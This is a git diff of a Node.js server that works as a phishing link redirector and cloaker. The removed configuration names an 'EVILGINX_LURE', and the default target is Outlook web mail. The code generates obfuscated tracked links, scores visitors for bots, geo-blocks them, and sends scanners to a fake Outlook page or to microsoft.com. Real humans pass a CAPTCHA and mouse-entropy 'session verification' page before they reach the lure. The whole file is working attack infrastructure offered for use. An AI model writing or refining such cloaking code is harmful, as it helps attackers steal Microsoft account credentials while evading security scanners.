@@ -5,33 +5,41 @@ const fs = require('fs');
 const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
 const fetch = require('node-fetch'); // npm install node-fetch@2
-const path = require('path');
 
 const app = express();
 
 app.set('trust proxy', 1);
 
-// Serve static files from public directory (for verify.js)
-app.use(express.static(path.join(__dirname, 'public')));
+// ────────────────────────────────────────────────
+// CONFIG FROM .env / Render Environment
+// ────────────────────────────────────────────────
+const TARGET_URL = process.env.TARGET_URL || 'https://www.microsoft.com';   // real user redirect
+const BOT_URL     = process.env.BOT_URL     || 'https://www.microsoft.com'; // bots / blocked / fail redirect
 
-// Config
-const EVILGINX_LURE = process.env.EVILGINX_LURE || 'https://www.microsoft.com';
-const TURNSTILE_SITEKEY = process.env.TURNSTILE_SITEKEY || 'YOUR_TURNSTILE_SITEKEY';
-const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || 'YOUR_TURNSTILE_SECRET';
-const USE_TURNSTILE_RAW = process.env.USE_TURNSTILE || 'false'; // default off for testing
-const LOG_FILE = 'clicks.log';
+const CAPTCHA_PROVIDER = (process.env.CAPTCHA_PROVIDER || 'none').toLowerCase(); // turnstile | hcaptcha | none
+
+const TURNSTILE_SITEKEY = process.env.TURNSTILE_SITEKEY || '';
+const TURNSTILE_SECRET  = process.env.TURNSTILE_SECRET  || '';
+
+const HCAPTCHA_SITEKEY = process.env.HCAPTCHA_SITEKEY || '';
+const HCAPTCHA_SECRET  = process.env.HCAPTCHA_SECRET  || '';
 
 const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(c => c.trim());
 const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(c => c.trim());
 const GEO_API_URL = process.env.GEO_API_URL || 'https://ipapi.co/{ip}/country/';
 
-const PORT = process.env.PORT || 3000; // Render sets PORT=10000 automatically
+const LOG_FILE = 'clicks.log';
+const PORT = process.env.PORT || 3000;
 
-const useTurnstile = USE_TURNSTILE_RAW === 'true' ||
-                     USE_TURNSTILE_RAW === '1' ||
-                     (USE_TURNSTILE_RAW !== 'false' && USE_TURNSTILE_RAW !== '0' &&
-                      TURNSTILE_SITEKEY && TURNSTILE_SITEKEY !== 'YOUR_TURNSTILE_SITEKEY');
+// Determine active CAPTCHA
+const useTurnstile = CAPTCHA_PROVIDER === 'turnstile' && TURNSTILE_SITEKEY && TURNSTILE_SECRET;
+const useHCaptcha  = CAPTCHA_PROVIDER === 'hcaptcha'  && HCAPTCHA_SITEKEY  && HCAPTCHA_SECRET;
+const useCaptcha   = useTurnstile || useHCaptcha;
 
+// ────────────────────────────────────────────────
+// CSP + NONCE (Helmet)
+// Only load CAPTCHA domains when that provider is active
+// ────────────────────────────────────────────────
 app.use((req, res, next) => {
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
   next();
@@ -41,20 +49,36 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
+      scriptSrc: [
+        "'self'",
+        (req, res) => `'nonce-${res.locals.nonce}'`,
+        ...(useTurnstile ? ['https://challenges.cloudflare.com'] : []),
+        ...(useHCaptcha  ? ['https://js.hcaptcha.com', 'https://newassets.hcaptcha.com'] : [])
+      ],
+      styleSrc: ["'self'", "'unsafe-inline'"],
       imgSrc: ["'self'", 'data:'],
-      styleSrc: ["'self'"],
-      // Add more as needed
-    }
-  }
+      connectSrc: [
+        "'self'",
+        ...(useTurnstile ? ['https://challenges.cloudflare.com'] : []),
+        ...(useHCaptcha  ? ['https://hcaptcha.com', 'https://*.hcaptcha.com'] : [])
+      ],
+      frameSrc: [
+        ...(useTurnstile ? ['https://challenges.cloudflare.com'] : []),
+        ...(useHCaptcha  ? ['https://newassets.hcaptcha.com', 'https://hcaptcha.com'] : [])
+      ],
+    },
+  },
 }));
 
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// Health check for Render
+// Health checks
 app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
 
+// ────────────────────────────────────────────────
+// BOT DETECTION & RATE LIMIT
+// ────────────────────────────────────────────────
 const strictLimiter = rateLimit({
   windowMs: 60 * 1000,
   max: 4,
@@ -90,7 +114,9 @@ function isLikelyBot(req) {
   return score >= 40;
 }
 
-// Get country code
+// ────────────────────────────────────────────────
+// GEO CHECK
+// ────────────────────────────────────────────────
 async function getCountryCode(req) {
   if (req.headers['cf-ipcountry']) return req.headers['cf-ipcountry'].toUpperCase();
 
@@ -106,49 +132,48 @@ async function getCountryCode(req) {
   return 'XX';
 }
 
-// Turnstile verification endpoint (kept but not used since useTurnstile=false)
-app.post('/turnstile-verify', async (req, res) => {
+// ────────────────────────────────────────────────
+// CAPTCHA VERIFICATION (supports Turnstile & hCaptcha)
+// ────────────────────────────────────────────────
+app.post('/captcha-verify', async (req, res) => {
   const { token } = req.body;
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
 
-  if (!token) return res.status(400).json({ success: false });
+  if (!token) return res.status(400).json({ success: false, error: 'No token' });
+
+  let verifyUrl, secret;
+
+  if (useTurnstile) {
+    verifyUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
+    secret = TURNSTILE_SECRET;
+  } else if (useHCaptcha) {
+    verifyUrl = 'https://hcaptcha.com/siteverify';
+    secret = HCAPTCHA_SECRET;
+  } else {
+    return res.status(400).json({ success: false, error: 'No CAPTCHA configured' });
+  }
 
   try {
-    const form = new URLSearchParams({ secret: TURNSTILE_SECRET, response: token, remoteip: ip });
-    const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+    const form = new URLSearchParams({ secret, response: token, remoteip: ip });
+    const verify = await fetch(verifyUrl, {
       method: 'POST',
       body: form,
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
     });
     const result = await verify.json();
-    res.json({ success: result.success });
-  } catch {
+
+    res.json({ success: !!result.success });
+  } catch (err) {
+    console.error('[CAPTCHA VERIFY ERROR]', err.message);
     res.status(500).json({ success: false });
   }
 });
 
-// Fingerprint endpoint
-app.post('/fingerprint', (req, res) => {
-  const data = req.body;
-  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
-  const ua = req.headers['user-agent'] || 'unknown';
-
-  let score = 0;
-  if (!data.canvas || data.canvas.includes('iVBORw0KGgo')) score += 30;
-  if (['swiftshader','angle','llvmpipe','software'].some(b => data.webglRenderer?.toLowerCase().includes(b))) score += 40;
-  if (data.hardwareConcurrency <= 2) score += 20;
-  if (data.deviceMemory <= 4) score += 15;
-  if (/mobile/i.test(ua) && data.touchPoints === 0) score += 25;
-  if (data.timezone === 'UTC' && /en/i.test(ua)) score += 15;
-  if (data.pluginsLength > 5 || data.mimeTypesLength > 10) score += 20;
-
-  console.log(`[FP] ${ip} | Score: ${score}`);
-  res.json({ status: 'ok', score });
-});
-
-// Generate obfuscated link
+// ────────────────────────────────────────────────
+// GENERATE LINK
+// ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
-  const target = req.query.target || 'https://outlook.office.com/mail/';
+  const target = req.query.target || TARGET_URL;
   const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();
   let enc = base64.encode(noisy);
   enc = encodeURIComponent(enc);
@@ -176,7 +201,9 @@ app.get('/generate', (req, res) => {
   res.json({ success: true, tracked: url, length: url.length });
 });
 
-// Main tracked route
+// ────────────────────────────────────────────────
+// MAIN ROUTE /r/*
+// ────────────────────────────────────────────────
 app.get('/r/*', strictLimiter, async (req, res) => {
   const ua = req.headers['user-agent'] || '';
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
@@ -189,16 +216,17 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
   const benignPage = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Outlook</title><style>body{font-family:'Segoe UI',sans-serif;background:#fff;}.hdr{background:#0078d4;color:#fff;padding:12px;}.cnt{padding:24px;}</style></head><body><div class="hdr">Outlook</div><div class="cnt"><h1>Loading inbox...</h1><p>Please wait.</p></div></body></html>`;
 
+  // Block bots or geo-restricted → send to BOT_URL
   if (!geoAllowed || isLikelyBot(req)) {
     const reason = !geoAllowed ? 'GEO_BLOCKED' : 'BOT_BLOCK';
     fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${reason} ${ip} ${country}\n`, () => {});
-    return res.status(200).send(benignPage);
+    return res.redirect(BOT_URL);
   }
 
   fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${ip} ${country} ${ua}\n`, () => {});
 
-  // Safe decoding of ?p= parameter
-  let redirectTarget = EVILGINX_LURE;
+  // Decode target from ?p= (fallback to TARGET_URL if missing/invalid)
+  let redirectTarget = TARGET_URL;
   try {
     const query = req.url.split('?')[1] || '';
     const params = new URLSearchParams(query);
@@ -211,9 +239,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       const hashIdx = decoded.indexOf('#');
       if (hashIdx !== -1) decoded = decoded.substring(0, hashIdx);
 
-      if (!/^https?:\/\//i.test(decoded)) {
-        decoded = 'https://' + decoded;
-      }
+      if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;
 
       const urlObj = new URL(decoded);
       if (urlObj.protocol === 'http:' || urlObj.protocol === 'https:') {
@@ -226,6 +252,9 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
   const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");
 
+  // ────────────────────────────────────────────────
+  // VERIFICATION PAGE
+  // ────────────────────────────────────────────────
   res.send(`
 <!DOCTYPE html>
 <html lang="en">
@@ -233,6 +262,11 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Session Verification</title>
+
+  <!-- CAPTCHA script - only when provider active -->
+  ${useTurnstile ? `<script nonce="${res.locals.nonce}" src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>` : ''}
+  ${useHCaptcha  ? `<script nonce="${res.locals.nonce}" src="https://js.hcaptcha.com/1/api.js" async defer></script>` : ''}
+
   <style>
     body { font-family: system-ui, sans-serif; background:#f3f2f1; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh; color:#333; }
     .box { background:white; padding:40px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; max-width:400px; }
@@ -240,6 +274,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     @keyframes spin { to { transform:rotate(360deg); } }
     h2 { margin:0 0 16px; }
     p { margin:0 0 24px; color:#555; }
+    #error-msg { color: #d32f2f; margin-top: 20px; font-size: 14px; display: none; }
   </style>
 </head>
 <body>
@@ -247,18 +282,121 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     <div class="spin"></div>
     <h2>Verifying session</h2>
     <p>Please wait...</p>
+
+    ${useTurnstile ? `
+      <div class="cf-turnstile"
+           data-sitekey="${TURNSTILE_SITEKEY}"
+           data-callback="onCaptchaSuccess"
+           data-theme="light"
+           data-size="invisible"></div>
+    ` : ''}
+    ${useHCaptcha ? `
+      <div class="h-captcha"
+           data-sitekey="${HCAPTCHA_SITEKEY}"
+           data-callback="onCaptchaSuccess"
+           data-theme="light"
+           data-size="invisible"></div>
+    ` : ''}
+
+    <div id="error-msg"></div>
   </div>
 
   <script nonce="${res.locals.nonce}">
-    window.REDIRECT_TARGET = '${safeTarget}';
+    const errorDiv = document.getElementById('error-msg');
+
+    function showError(msg) {
+      console.error('[CAPTCHA Error]', msg);
+      if (errorDiv) {
+        errorDiv.textContent = msg;
+        errorDiv.style.display = 'block';
+      }
+    }
+
+    let moves = 0;
+    let entropy = 0;
+    let lastX = 0, lastY = 0, lastTime = Date.now();
+
+    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const minMoves   = mobile ? 3 : 5;
+    const minEntropy = mobile ? 9 : 16;
+
+    function updateEntropy(dx, dy, type) {
+      const now = Date.now();
+      const dt = (now - lastTime) / 1000 || 1;
+      const dist = Math.sqrt(dx*dx + dy*dy);
+      entropy += Math.log2(1 + dist + 1) / dt * (type === 'touch' ? 4 : 1);
+      lastTime = now;
+      moves++;
+    }
+
+    document.addEventListener('mousemove', e => {
+      if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY), 'mouse');
+      lastX = e.clientX; lastY = e.clientY;
+    });
+
+    document.addEventListener('touchmove', e => {
+      if (e.touches?.length) {
+        const t = e.touches[0];
+        if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY), 'touch');
+        lastX = t.clientX; lastY = t.clientY;
+      }
+    });
+
+    window.addEventListener('scroll', () => { entropy += 10; moves += 2; });
+    window.addEventListener('wheel', () => { entropy += 8; moves += 2; });
+    document.addEventListener('keydown', () => { entropy += 6; moves += 2; });
+
+    function onCaptchaSuccess(token) {
+      console.log('[CAPTCHA] Token received');
+      fetch('/captcha-verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token })
+      })
+      .then(r => r.json())
+      .then(data => {
+        if (!data.success) {
+          showError('CAPTCHA failed');
+          return location.href = '${BOT_URL}';
+        }
+        console.log('[CAPTCHA] Verified');
+        proceedToRedirect();
+      })
+      .catch(err => {
+        console.error('[CAPTCHA] Fetch error:', err);
+        showError('Verification server error');
+        location.href = '${BOT_URL}';
+      });
+    }
+
+    function proceedToRedirect() {
+      setTimeout(() => {
+        console.log('CHECK | Moves:', moves, 'Entropy:', entropy.toFixed(1));
+        if (moves >= minMoves && entropy >= minEntropy) {
+          location.href = '${TARGET_URL}';
+        } else {
+          location.href = '${BOT_URL}';
+        }
+      }, 1200 + Math.random() * 1800);
+    }
+
+    // Main timeout / fallback (15s max)
+    setTimeout(() => {
+      if (${useCaptcha ? 'typeof turnstile !== "undefined" || typeof hcaptcha !== "undefined"' : 'true'}) {
+        proceedToRedirect();
+      } else {
+        console.error('[CAPTCHA] Failed to load');
+        location.href = '${BOT_URL}';
+      }
+    }, 15000);
   </script>
-  <script src="/verify.js"></script>
 </body>
 </html>
   `);
 });
 
-app.use((req, res) => res.redirect('https://www.microsoft.com'));
+// Catch-all redirect to bot URL
+app.use((req, res) => res.redirect(BOT_URL));
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
